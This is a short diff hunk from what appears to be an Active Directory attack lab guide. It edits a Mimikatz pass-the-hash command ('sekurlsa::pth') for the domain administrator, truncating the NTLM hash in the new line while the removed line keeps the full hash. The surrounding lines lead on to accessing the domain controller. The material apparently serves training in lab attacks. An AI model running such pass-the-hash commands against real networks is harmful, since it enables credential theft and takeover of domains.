@@ -67,7 +67,7 @@ ocal""'
 On CLIENT
 
 ```
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:38a08b8218669328bf7b82bdff3b81d9 /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:38a...b81d9 /run:powershell.exe"'
 ```
 
 Now, access the Domain Controller:
